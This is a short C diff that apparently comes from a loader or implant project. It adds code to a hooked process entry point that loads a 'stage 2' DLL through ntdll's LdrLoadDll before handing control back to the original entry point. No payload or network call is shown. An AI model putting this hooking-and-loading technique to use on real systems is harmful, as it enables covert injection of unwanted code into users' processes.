@@ -280,7 +280,20 @@ void hook_process_entry_point(void* arg_1, void* arg_2, void* arg_3,
 
   // SK: Load stage 2 DLL
 
+  PWSTR DllPath = NULL;
+  ULONG DllCharacteristics = 0;
+  UNICODE_STRING DllName;
+  RtlInitUnicodeString(&DllName, (PWSTR)L"stage2_DLL.dll");
+  PVOID DllHandle;
 
+
+
+  LdrLoadDll(
+    DllPath,
+    &DllCharacteristics,
+    &DllName,
+    &DllHandle
+  );
 
   trampoline_process_entry_point(arg_1, arg_2, arg_3,
     arg_4, arg_5, arg_6,
